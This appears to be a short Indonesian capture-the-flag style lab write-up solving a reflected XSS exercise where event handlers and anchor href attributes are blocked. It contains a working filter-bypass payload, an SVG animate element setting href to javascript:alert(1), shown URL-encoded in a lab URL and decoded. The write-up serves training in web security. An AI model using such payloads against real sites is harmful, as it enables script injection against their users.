## Lab 5 Reflected XSS with event handlers and href attributes blocked

## brief:
	refelected xss dengan beberapa whitelists tags, tapi semua event dan anchor href diblokir

## Tujuan:
	lakukan alert() ketika diklik

<img width="1920" height="1032" alt="brief" src="https://github.com/user-attachments/assets/9d0efcd7-ef59-4e60-98db-b5474e168d4f" />

## Analisa:
1. semua tag diblock kecuali yang di whitelists

<img width="1920" height="1032" alt="gagal" src="https://github.com/user-attachments/assets/fc7dba19-22f1-4d11-a1c5-64f65364e515" />

2. kunjungi ke url

> htts://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

<img width="1920" height="1032" alt="berhasil" src="https://github.com/user-attachments/assets/a565ebb2-61bc-49d6-b759-a84fd48366ca" />

3. klik clik me dan berhasil

		<svg><a><animate+attributeName=href+values=javascript:alert(1) /><text+x=20+y=20>'Click'</text></a>
